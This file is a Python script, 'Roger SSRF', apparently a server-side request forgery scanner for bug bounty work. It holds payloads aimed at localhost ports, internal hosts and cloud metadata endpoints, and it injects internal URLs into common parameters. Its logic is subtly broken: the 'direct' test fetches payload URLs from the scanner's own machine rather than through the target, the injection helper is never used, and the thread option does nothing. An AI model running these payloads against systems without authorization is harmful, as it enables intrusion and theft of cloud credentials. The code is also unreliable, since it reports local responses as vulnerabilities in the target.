#!/usr/bin/env python3
"""
Roger SSRF - Server-Side Request Forgery scanner for bug bounty hunting.
"""

import argparse
import concurrent.futures
import requests
import urllib3
import re
import sys
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# SSRF test payloads
SSRF_PAYLOADS = [
    # Internal IPs
    "http://127.0.0.1",
    "http://localhost",
    "http://127.0.0.1:22",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://localhost:8080",
    "http://[::1]",
    "http://127.1",
    "http://0.0.0.0",
    "http://0.0.0.0:80",
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/metadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/",
    # AWS
    "http://169.254.169.254/",
    "http://169.254.169.254/aws/latest/meta-data/",
    # Internal domains
    "http://internal",
    "http://intranet",
    "http://localhost.test",
    # Cloud storage
    "https://storage.googleapis.com",
    "https://blob.core.windows.net",
]

# Parameters commonly vulnerable to SSRF
SSRF_PARAMS = [
    "url", "uri", "dest", "redirect", "next", "data", "reference", "site",
    "html", "val", "validate", "domain", "callback", "return", "page", "feed",
    "host", "port", "to", "out", "view", "dir", "show", "navigation", "open",
    "file", "document", "folder", "pg", "style", "doc", "img", "source",
    "target", "url", "link", "src", "source", "u", "url", "api", "oauth",
]


class RogerSSRF:
    def __init__(self, target, threads=10, quiet=False, output=None, timeout=10):
        self.target = target.rstrip('/')
        self.threads = threads
        self.quiet = quiet
        self.output = output
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.findings = []
        
    def test_ssrf(self, url, payload):
        """Test a single SSRF payload."""
        try:
            # Try the payload directly in the URL
            if '://' in payload:
                test_url = payload
            else:
                test_url = f"http://{payload}"
            
            response = self.session.get(
                test_url,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            
            return {
                "url": url,
                "payload": payload,
                "status": response.status_code,
                "success": True,
                "length": len(response.content)
            }
        except requests.exceptions.Timeout:
            return {"url": url, "payload": payload, "status": "timeout", "success": False}
        except requests.exceptions.ConnectionError:
            return {"url": url, "payload": payload, "status": "refused", "success": False}
        except requests.exceptions.InvalidURL:
            return {"url": url, "payload": payload, "status": "invalid", "success": False}
        except Exception as e:
            return {"url": url, "payload": payload, "status": "error", "error": str(e), "success": False}
    
    def inject_payloads(self, url, params):
        """Inject SSRF payloads into parameters."""
        from urllib.parse import parse_qs, urlencode, urlunparse
        
        results = []
        
        for param in params:
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            query[param] = "SSRF_PAYLOAD"
            
            new_query = urlencode(query, doseq=True)
            new_parsed = parsed._replace(query=new_query)
            test_url = urlunparse(new_parsed)
            
            results.append((test_url, param))
        
        return results
    
    def scan_endpoint(self, url):
        """Scan a single endpoint for SSRF."""
        findings = []
        
        if not self.quiet:
            print(f"[*] Testing: {url}")
        
        # Test direct payloads
        for payload in SSRF_PAYLOADS[:10]:  # Quick test first 10
            result = self.test_ssrf(url, payload)
            
            if result.get("status") in [200, 201, 204, 301, 302]:
                if not self.quiet:
                    print(f"  [!] Potential SSRF: {payload} -> {result.get('status')}")
                findings.append({
                    "url": url,
                    "payload": payload,
                    "type": "direct",
                    "status": result.get("status")
                })
        
        return findings
    
    def scan_params(self, url):
        """Scan URL parameters for SSRF."""
        findings = []
        
        # Get all parameters
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        if not query_params:
            # Try common SSRF parameters on the base URL
            for param in SSRF_PARAMS[:15]:
                test_url = f"{url}?{param}=http://127.0.0.1"
                
                try:
                    response = self.session.get(
                        test_url,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    if response.status_code != 404:
                        if not self.quiet:
                            print(f"  [*] Param test: {param}")
                        
                        # Check for internal IP in response
                        if "127.0.0.1" in response.text or "localhost" in response.text:
                            findings.append({
                                "url": test_url,
                                "parameter": param,
                                "type": "parameter_injection",
                                "severity": "HIGH"
                            })
                            
                except Exception as e:
                    pass
        
        return findings
    
    def scan(self):
        """Run the SSRF scanner."""
        print(f"[*] Starting SSRF scan on: {self.target}")
        print(f"[*] Testing {len(SSRF_PAYLOADS)} payloads")
        print("=" * 60)
        
        # Test the target directly
        print("[*] Testing direct SSRF vectors...")
        direct_findings = self.scan_endpoint(self.target)
        
        # Test parameter injection
        print("[*] Testing parameter injection...")
        param_findings = self.scan_params(self.target)
        
        # Combine findings
        all_findings = direct_findings + param_findings
        
        # Print results
        print()
        print("=" * 60)
        
        if all_findings:
            print("[!] POTENTIAL SSRF VULNERABILITIES:")
            print()
            
            for finding in all_findings:
                print(f"[!] URL: {finding['url']}")
                print(f"    Type: {finding['type']}")
                if 'payload' in finding:
                    print(f"    Payload: {finding['payload']}")
                if 'parameter' in finding:
                    print(f"    Parameter: {finding['parameter']}")
                print()
                
                self.findings.append(finding)
        else:
            print("[*] No obvious SSRF vulnerabilities found")
            print("[*] Note: SSRF often requires manual testing")
            print("[*] Try injecting into: url, dest, redirect, callback, src, etc.")
        
        # Save results
        if self.output and self.findings:
            with open(self.output, 'w') as f:
                f.write(f"# SSRF Scan Results for {self.target}\n\n")
                for finding in self.findings:
                    f.write(f"URL: {finding['url']}\n")
                    f.write(f"Type: {finding['type']}\n")
                    if 'payload' in finding:
                        f.write(f"Payload: {finding['payload']}\n")
                    f.write("\n")
        
        print(f"[*] Total potential issues: {len(self.findings)}")
        
        return self.findings


def main():
    parser = argparse.ArgumentParser(
        description="Roger SSRF - Server-Side Request Forgery scanner for bug bounty hunting"
    )
    parser.add_argument("target", help="Target URL")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
    parser.add_argument("-o", "--output", help="Output results to file")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    
    args = parser.parse_args()
    
    scanner = RogerSSRF(
        target=args.target,
        threads=args.threads,
        quiet=args.quiet,
        output=args.output,
        timeout=args.timeout
    )
    
    scanner.scan()


if __name__ == "__main__":
    main()